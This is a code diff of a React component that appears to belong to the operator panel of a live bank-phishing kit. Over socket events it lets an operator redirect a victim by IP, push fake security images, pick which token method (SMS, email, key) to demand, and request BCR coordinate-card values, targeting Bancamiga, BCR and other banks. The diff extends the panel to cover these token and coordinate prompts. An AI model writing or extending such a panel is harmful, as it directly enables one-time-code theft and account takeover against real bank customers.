@@ -1,31 +1,35 @@
 import { useFormik } from "formik"
 import {Popover, Button, PopoverTrigger, PopoverContent, Checkbox} from '@nextui-org/react';
 import { useState } from "react";
-export const RedirectIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
+export const RedirectIconLive = ({socket, ip, nameBank, urlPage, onClose, textPage}) => {
   
   const [formView, setFormView] = useState(false)
   const [isSelected, setIsSelected] = useState(false)
-  const [listPhotoCopy, setListPhotoCopy] = useState(false)
   
+  console.log(nameBank)
   const {values, handleBlur, handleChange, handleSubmit } = useFormik({
     initialValues: {
-      image: ''
+      image: '',
+      methodToken: 'SMS Token + Token Email.',
+      coordinate: ''
     },
-    onSubmit: async({image}) =>{
+    onSubmit: async({image, methodToken, coordinate}) =>{
       if(textPage == 'Metodo seguridad' && !isSelected) socket.emit('[bancamiga] getImage', {image, ip})
       if(textPage == 'Imagen') {
         (isSelected) 
         ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
         : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
       }
-      socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true })
+      if(textPage == 'Metodo de token') socket.emit('[ebillion] sendMethodToken', {methodToken})
+      if(textPage == 'Token + Coordenadas') socket.emit('[bcr] getCoordinates', {coordinate, ip})
+      socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank })
       setFormView(false)
       onClose()
     }
   })
   const sendBagRedirect = () => {
-    if(textPage == 'Metodo seguridad' || textPage == 'Imagen' ) return setFormView(true)
-    socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true })
+    if(textPage == 'Metodo seguridad' || textPage == 'Imagen' || textPage == 'Metodo de token' || textPage == 'Token + Coordenadas') return setFormView(true)
+    socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank  })
     setFormView(false)
     onClose()
   }
@@ -42,13 +46,39 @@ export const RedirectIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
         </PopoverTrigger>
         <PopoverContent >
           <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
-            <p>Introduce el link de la imagen</p>
-            <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
+            {
+              textPage == 'Token + Coordenadas' ? (
+                  <>
+                    <p>Manda tus coordenadas BCR</p>
+                    <input required autoComplete="false" className="w-full py-1 pl-2" type="number" name="coordinate" value={values.coordinate.toString().slice(0,2)} onChange={handleChange} />
+                  </>
+
+              ) : null
+            }
+            {
+              textPage == 'Metodo de token' 
+              ? (
+              <>
+                <p>Escoge cual es el metodo token</p>
+                <select name="methodToken" onChange={handleChange}  className="py-2" value={values.methodToken}  defaultValue={'SMS Token + Token Email.'}>
+                  <option value="SMS Token + Token Email.">SMS Token + Token Email.</option>
+                  <option value="SMS Token + Key.">SMS Token + Key.</option>
+                  <option value="Token Email + Key.">Token Email + Key.</option>
+                </select>
+              </>
+              )
+              : null
+
+            }
             {
               textPage == 'Metodo seguridad' ? (
+                <>
+                  <p>Introduce el link de la imagen</p>
+                  <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
                   <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                     Omitir foto
                   </Checkbox>
+                </>
               ) : null
             }
             {
@@ -58,6 +88,7 @@ export const RedirectIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
                   </Checkbox>
               ) : null
             }
+           
             <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
           </form>
         </PopoverContent>
